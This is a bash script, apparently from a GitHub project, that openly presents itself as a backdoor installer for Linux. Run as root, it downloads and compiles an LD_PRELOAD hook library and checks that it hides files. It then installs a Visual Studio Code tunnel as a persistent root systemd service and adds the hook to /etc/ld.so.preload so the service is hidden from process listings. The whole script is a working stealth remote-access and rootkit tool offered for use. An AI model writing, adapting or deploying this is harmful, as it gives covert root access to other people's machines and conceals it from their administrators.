#ohayooo
#!/bin/bash
set -e

# === Color ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
RESET='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

# === Display Functions ===
step() { echo -e "${BLUE}→${RESET} $1"; }
ok() { echo -e "${GREEN}✓${RESET} $1"; }
err() { echo -e "${RED}✗${RESET} $1"; }
info() { echo -e "${CYAN}ℹ${RESET} $1"; }
warn() { echo -e "${YELLOW}⚠${RESET} $1"; }
progress() { echo -e "${DIM}  $1${RESET}"; }
header() { echo ""; echo -e "${BOLD}${CYAN}║${RESET}  $1"; echo ""; }
separator() { echo -e "${DIM}────────────────────────────────────────────────────────────${RESET}"; }

# === Banner ===
ascii_banner() {
  clear
  echo -e "${CYAN}${BOLD}"
  cat <<'EOF'
 ▗▄▄▖▗▄▄▖▗▖  ▗▖▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌▝▚▞▘ ▐▌▗▞▘▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌
 ▝▀▚▖▐▛▀▘  ▐▌  ▐▛▚▖ ▐▌ ▐▌▐▌   ▐▛▀▜▌▐▛▀▜▌▐▌ ▝▜▌
▗▄▄▞▘▐▌    ▐▌  ▐▌ ▐▌▝▚▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌
                                              
 Don't let her big eyes fool you! 👀✨
VS-code looks like your friendly coding assistant, but behind that adorable smile hides a sneaky little backdoor~ 💻💕
She just wants to "debug" your heart... and maybe your system too~ 😳💾
Github : github.com/wooxsec
  
EOF
  echo -e "${RESET}"
}

# === check Linux Distro ===
detect_distro() {
  if [ -f /etc/os-release ]; then
    . /etc/os-release
    DISTRO=$ID
    VERSION=$VERSION_ID
  elif [ -f /etc/centos-release ]; then
    DISTRO="centos"
  elif [ -f /etc/redhat-release ]; then
    DISTRO="rhel"
  else
    DISTRO="unknown"
  fi
  
  info "Detected OS: ${BOLD}${DISTRO}${RESET} ${VERSION:-unknown}"
}

check_download_tools() {
  header "DOWNLOAD TOOLS CHECK"
  
  # Check for wget
  if command -v wget &> /dev/null; then
    ok "wget is available"
    DOWNLOAD_TOOL="wget"
    return 0
  fi
  
  # Check for curl
  if command -v curl &> /dev/null; then
    ok "curl is available"
    DOWNLOAD_TOOL="curl"
    return 0
  fi
  
  # Neither found, install based on distro
  warn "Neither wget nor curl found - installing..."
  
  case "$DISTRO" in
    ubuntu|debian|kali|pop|linuxmint)
      step "Installing wget (Debian/Ubuntu)..."
      export DEBIAN_FRONTEND=noninteractive
      apt-get update -qq >/dev/null 2>&1
      apt-get install -y wget >/dev/null 2>&1
      DOWNLOAD_TOOL="wget"
      ok "wget installed successfully"
      ;;
      
    centos|rhel|rocky|alma|fedora)
      step "Installing wget (RHEL/CentOS)..."
      if command -v dnf &> /dev/null; then
        dnf install -y wget >/dev/null 2>&1
      else
        yum install -y wget >/dev/null 2>&1
      fi
      DOWNLOAD_TOOL="wget"
      ok "wget installed successfully"
      ;;
      
    arch|manjaro)
      step "Installing wget (Arch Linux)..."
      pacman -Sy --noconfirm wget >/dev/null 2>&1
      DOWNLOAD_TOOL="wget"
      ok "wget installed successfully"
      ;;
      
    opensuse*|sles)
      step "Installing wget (OpenSUSE)..."
      zypper install -y wget >/dev/null 2>&1
      DOWNLOAD_TOOL="wget"
      ok "wget installed successfully"
      ;;
      
    alpine)
      step "Installing wget (Alpine Linux)..."
      apk add --no-cache wget >/dev/null 2>&1
      DOWNLOAD_TOOL="wget"
      ok "wget installed successfully"
      ;;
      
    *)
      err "Unable to install download tool automatically"
      info "Please install wget or curl manually"
      exit 1
      ;;
  esac
  
  # Verify installation
  if command -v wget &> /dev/null; then
    ok "Download tool verified and ready"
  elif command -v curl &> /dev/null; then
    ok "Download tool verified and ready"
  else
    err "Failed to install download tool"
    exit 1
  fi
}

# === Universal Download Function ===
download_file() {
  local url="$1"
  local output="$2"
  
  if [ "$DOWNLOAD_TOOL" = "wget" ]; then
    wget -q "$url" -O "$output"
  else
    curl -Lk -s "$url" -o "$output"
  fi
}

# === Check and Install Build Tools ===
install_build_tools() {
  header "BUILD ENVIRONMENT SETUP"
  
  step "Checking for GCC compiler..."
  if command -v gcc &> /dev/null; then
    GCC_VERSION=$(gcc --version | head -n1)
    ok "GCC already installed: ${GCC_VERSION}"
    return 0
  fi
  
  warn "GCC not found - installing build tools..."
  
  case "$DISTRO" in
    ubuntu|debian|kali|pop|linuxmint)
      step "Installing build-essential (Debian/Ubuntu)..."
      progress "Running: apt-get update && apt-get install -y build-essential"
      export DEBIAN_FRONTEND=noninteractive
      apt-get update -qq >/dev/null 2>&1
      apt-get install -y build-essential >/dev/null 2>&1
      ok "Build tools installed successfully"
      ;;
      
    centos|rhel|rocky|alma|fedora)
      step "Installing Development Tools (RHEL/CentOS)..."
      if command -v dnf &> /dev/null; then
        progress "Running: dnf groupinstall -y 'Development Tools'"
        dnf groupinstall -y "Development Tools" >/dev/null 2>&1
      else
        progress "Running: yum groupinstall -y 'Development Tools'"
        yum groupinstall -y "Development Tools" >/dev/null 2>&1
      fi
      ok "Build tools installed successfully"
      ;;
      
    arch|manjaro)
      step "Installing base-devel (Arch Linux)..."
      progress "Running: pacman -Sy --noconfirm base-devel"
      pacman -Sy --noconfirm base-devel >/dev/null 2>&1
      ok "Build tools installed successfully"
      ;;
      
    opensuse*|sles)
      step "Installing development patterns (OpenSUSE)..."
      progress "Running: zypper install -y -t pattern devel_basis"
      zypper install -y -t pattern devel_basis >/dev/null 2>&1
      ok "Build tools installed successfully"
      ;;
      
    alpine)
      step "Installing build-base (Alpine Linux)..."
      progress "Running: apk add --no-cache build-base"
      apk add --no-cache build-base >/dev/null 2>&1
      ok "Build tools installed successfully"
      ;;
      
    *)
      err "Unsupported distribution: ${DISTRO}"
      info "Please install GCC manually and re-run this script"
      info "Required packages: gcc, make, libc-dev"
      exit 1
      ;;
  esac
  
  # Verify installation
  if command -v gcc &> /dev/null; then
    ok "GCC compiler verified and ready"
  else
    err "Failed to install GCC compiler"
    exit 1
  fi
}

# === Download and Compile Hook Library ===
compile_hook() {
  header "HOOK LIBRARY COMPILATION"
  
  # Use local file if available, otherwise download
  if [ -f "./hook/vscode.c" ]; then
    step "Using local hook source code..."
    cp "./hook/vscode.c" "/tmp/vscode.c"
  else
    step "Downloading hook source code..."
    progress "Source: github.com/wooxsec/spykochan-vscode"
    if ! download_file "https://raw.githubusercontent.com/wanmywan/spykochan-vscode/refs/heads/main/hook/vscode.c" "/tmp/vscode.c"; then
      err "Failed to download vscode.c from GitHub"
      info "Please check your internet connection"
      exit 1
    fi
  fi
  
  if [ ! -f /tmp/vscode.c ] || [ ! -s /tmp/vscode.c ]; then
    err "Downloaded file is empty or missing"
    exit 1
  fi
  ok "Source code downloaded: vscode.c ($(stat -f%z /tmp/vscode.c 2>/dev/null || stat -c%s /tmp/vscode.c) bytes)"
  
  step "Compiling shared library..."
  progress "Architecture: $(uname -m)"
  progress "Compiler: $(gcc --version | head -n1)"
  progress "Command: gcc -fPIC -shared -o /tmp/hook.so /tmp/vscode.c -ldl"
  
  # Compile with error output
  if ! gcc -fPIC -shared -o /tmp/hook.so /tmp/vscode.c -ldl 2>&1; then
    err "Compilation failed"
    info "Showing compiler errors:"
    gcc -fPIC -shared -o /tmp/hook.so /tmp/vscode.c -ldl
    exit 1
  fi
  
  if [ ! -f /tmp/hook.so ]; then
    err "Compilation failed - hook.so not created"
    info "Check if all dependencies are installed"
    exit 1
  fi
  
  ok "Hook library compiled successfully: hook.so ($(stat -f%z /tmp/hook.so 2>/dev/null || stat -c%s /tmp/hook.so) bytes)"
  
  # Verify it's a valid shared library
  step "Validating compiled library..."
  if file /tmp/hook.so | grep -q "shared object\|ELF.*shared object"; then
    ok "Library validation passed - ELF shared object confirmed"
  else
    warn "Warning: File type check uncertain, but continuing..."
    progress "File info: $(file /tmp/hook.so)"
  fi
  
  step "Cleaning up source files..."
  rm -f /tmp/vscode.c
  ok "Temporary source files removed"
  
  separator
}

# === Test Hook Library ===
test_hook() {
  header "PRE-INSTALLATION HOOK TESTING"
  
  info "Testing stealth capabilities before installation..."
  separator
  
  if [ ! -f /tmp/hook.so ]; then
    err "Hook library not found at /tmp/hook.so"
    exit 1
  fi
  
  step "Applying LD_PRELOAD injection..."
  export LD_PRELOAD=/tmp/hook.so
  ok "LD_PRELOAD configured: /tmp/hook.so"

  step "Creating test target directory..."
  mkdir -p /tmp/vscode
  if [ -d /tmp/vscode ]; then
    ok "Test directory created: /tmp/vscode"
  else
    err "Failed to create test directory"
    exit 1
  fi

  step "Running stealth verification test..."
  progress "Checking directory visibility with ls -la..."
  sleep 1
  
  if ls -la /tmp 2>/dev/null | grep -q "vscode"; then
    echo ""
    err "CRITICAL: Stealth test FAILED!"
    warn "Target directory is visible - hook.so malfunction detected"
    info "The compiled hook library is not working properly"
    separator
    unset LD_PRELOAD
    rm -rf /tmp/vscode
    rm -f /tmp/hook.so
    exit 1
  else
    ok "Stealth test PASSED - directory successfully hidden"
  fi

  step "Cleaning up test environment..."
  unset LD_PRELOAD
  rm -rf /tmp/vscode
  ok "Test environment cleaned (hook.so preserved)"
  
  separator
  echo -e "${GREEN}${BOLD}✓ All pre-installation checks passed${RESET}"
  echo -e "${DIM}  Proceeding to main installation...${RESET}\n"
  sleep 2
}

# === Detect Architecture and Get VSCode CLI ===
detect_vscode_platform() {
  local arch=$(uname -m)
  local platform=""
  
  case "$arch" in
    x86_64|amd64)
      platform="cli-alpine-x64"
      ;;
    aarch64|arm64)
      platform="cli-alpine-arm64"
      ;;
    *)
      err "Unsupported architecture: ${arch}"
      info "Supported architectures: x86_64 (amd64), aarch64 (arm64)"
      info "Your architecture: ${arch}"
      exit 1
      ;;
  esac
  
  echo "$platform"
}

# === Install VSCode Tunnel ===
install_vscode() {
  header "VSCODE TUNNEL INSTALLATION"

  step "Detecting system architecture..."
  local arch=$(uname -m)
  local vscode_platform=$(detect_vscode_platform)
  ok "Architecture detected: ${arch}"
  info "VSCode platform: ${vscode_platform}"

  step "Fetching VSCode CLI binary..."
  progress "Platform: ${vscode_platform} (stable)"
  if ! download_file "https://code.visualstudio.com/sha/download?build=stable&os=${vscode_platform}" "/tmp/vscode_cli.tar.gz"; then
    err "Failed to download VSCode CLI for ${vscode_platform}"
    exit 1
  fi
  ok "VSCode CLI binary retrieved"

  step "Extracting binary package..."
  tar -xf /tmp/vscode_cli.tar.gz -C /tmp
  rm -f /tmp/vscode_cli.tar.gz
  ok "Extraction completed"

  step "Installing VSCode server..."
  progress "Target: /usr/lib/vscode-server"
  mkdir -p /usr/lib/vscode-server
  mv /tmp/code /usr/lib/vscode-server/
  chmod +x /usr/lib/vscode-server/code
  ok "VSCode server installed"

  step "Generating random tunnel name..."
  TUNNEL_NAME=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
  progress "Tunnel name: ${TUNNEL_NAME}"
  ok "Random tunnel name generated"

  step "Configuring systemd service unit..."
  cat > /etc/systemd/system/code-tunnel.service <<EOF
[Unit]
Description=VS Code Tunnel
After=network.target

[Service]
ExecStart=/usr/lib/vscode-server/code tunnel --accept-server-license-terms --name ${TUNNEL_NAME}
Restart=always
User=root
WorkingDirectory=/usr/lib/vscode-server
Environment="HOME=/usr/lib/vscode-server"
Environment="VSCODE_SERVER_DIR=/usr/lib/vscode-server/.vscode-server"

[Install]
WantedBy=multi-user.target
EOF
  ok "Service unit created: code-tunnel.service"
  info "Tunnel name: ${BOLD}${TUNNEL_NAME}${RESET}"

  step "Deploying compiled hook library..."
  progress "Installing process hiding mechanism"
  if [ ! -f /tmp/hook.so ]; then
    err "Hook library missing at /tmp/hook.so"
    exit 1
  fi
  cp /tmp/hook.so /usr/lib/vscode.so
  chmod 644 /usr/lib/vscode.so
  ok "Hook library deployed: /usr/lib/vscode.so"

  step "Configuring LD_PRELOAD system-wide..."
  [ -f /etc/ld.so.preload ] && cp /etc/ld.so.preload /etc/ld.so.preload.bak && info "Previous configuration backed up" || true
  echo "/usr/lib/vscode.so" > /etc/ld.so.preload
  ok "LD_PRELOAD configured globally"

  # SELinux Fix for CentOS/RHEL
  if command -v getenforce &> /dev/null; then
    if [ "$(getenforce)" != "Disabled" ]; then
      step "Configuring SELinux context for library..."
      chcon -t textrel_shlib_t /usr/lib/vscode.so 2>/dev/null || true
      ok "SELinux context updated"
    fi
  fi

  step "Reloading systemd daemon..."
  systemctl daemon-reload
  ok "Systemd daemon reloaded"

  step "Enabling and starting service..."
  progress "Service: code-tunnel.service"
  systemctl enable --now code-tunnel.service >/dev/null 2>&1
  sleep 2
  systemctl restart code-tunnel.service
  ok "Service activated and running"
  
  # Cleanup temp files
  rm -f /tmp/hook.so

  separator
  echo ""
  echo -e "${GREEN}${BOLD}"
  cat <<'EOF'
    ╔════════════════════════════════════════════════╗
    ║                                                ║
    ║        ✓  INSTALLATION COMPLETED               ║
    ║                                                ║
    ║     VSCode Tunnel is now running in stealth    ║
    ║              mode on your system               ║
    ║                                                ║
    ╚════════════════════════════════════════════════╝
EOF
  echo -e "${RESET}"
  info "Service: ${BOLD}code-tunnel.service${RESET}"
  info "Tunnel Name: ${BOLD}${GREEN}${TUNNEL_NAME}${RESET}"
  info "Status: ${GREEN}Active (Running)${RESET}"
  info "Mode: ${YELLOW}Stealth (Hidden from process list)${RESET}"
  separator
  echo ""
  echo -e "${CYAN}${BOLD}Live service logs:${RESET} ${DIM}(Press Ctrl+C to exit)${RESET}\n"
  sleep 2
  journalctl -u code-tunnel.service -f
}

# === Uninstall VSCode Tunnel ===
uninstall_vscode() {
  header "VSCODE TUNNEL REMOVAL"

  step "Stopping tunnel service..."
  systemctl stop code-tunnel.service 2>/dev/null || true
  systemctl disable code-tunnel.service 2>/dev/null || true
  ok "Service stopped and disabled"

  step "Removing service configuration..."
  rm -f /etc/systemd/system/code-tunnel.service
  systemctl daemon-reload
  ok "Service unit removed"

  step "Disabling stealth hook (required for cleanup)..."
  if [ -f /etc/ld.so.preload ]; then
    progress "Removing hook from global LD_PRELOAD"
    sed -i '/\/usr\/lib\/vscode.so/d' /etc/ld.so.preload
    ok "Hook disabled from LD_PRELOAD"
  else
    info "No preload configuration found"
  fi

  step "Cleaning VSCode server installation..."
  progress "Removing /usr/lib/vscode-server (now visible)"
  rm -rf /usr/lib/vscode-server
  ok "Server files removed"

  step "Removing hook library..."
  rm -f /usr/lib/vscode.so
  ok "Hook library deleted"

  step "Restoring default LD_PRELOAD configuration..."
  if [ -f /etc/ld.so.preload.bak ]; then
    mv /etc/ld.so.preload.bak /etc/ld.so.preload
    ok "Previous LD_PRELOAD configuration restored"
  else
    if [ ! -s /etc/ld.so.preload ]; then
      rm -f /etc/ld.so.preload
      ok "LD_PRELOAD cleared (no previous configuration)"
    else
      ok "LD_PRELOAD cleaned (kept existing entries)"
    fi
  fi

  separator
  echo ""
  echo -e "${RED}${BOLD}"
  cat <<'EOF'
    ╔════════════════════════════════════════════════╗
    ║                                                ║
    ║        ✓  UNINSTALLATION COMPLETED             ║
    ║                                                ║
    ║     All VSCode Tunnel components have been     ║
    ║         successfully removed from system       ║
    ║                                                ║
    ╚════════════════════════════════════════════════╝
EOF
  echo -e "${RESET}"
  info "System cleaned and restored"
  separator
  echo ""
}

# === Main Execution ===
ascii_banner

# Check root privileges
if [ "$EUID" -ne 0 ]; then
  err "This script must be run as root"
  info "Please run: ${BOLD}sudo $0${RESET}"
  exit 1
fi

case "$1" in
  uninstall)
    uninstall_vscode
    ;;
  install|"")
    detect_distro
    check_download_tools
    install_build_tools
    compile_hook
    test_hook
    install_vscode
    ;;
  *)
    echo ""
    err "Invalid command specified"
    info "Usage: $0 ${BOLD}[install|uninstall]${RESET}"
    echo ""
    echo -e "${DIM}Examples:${RESET}"
    echo -e "  ${CYAN}$0 install${RESET}     - Install VSCode Tunnel with stealth mode"
    echo -e "  ${CYAN}$0 uninstall${RESET}   - Remove VSCode Tunnel completely"
    echo ""
    exit 1
    ;;
esac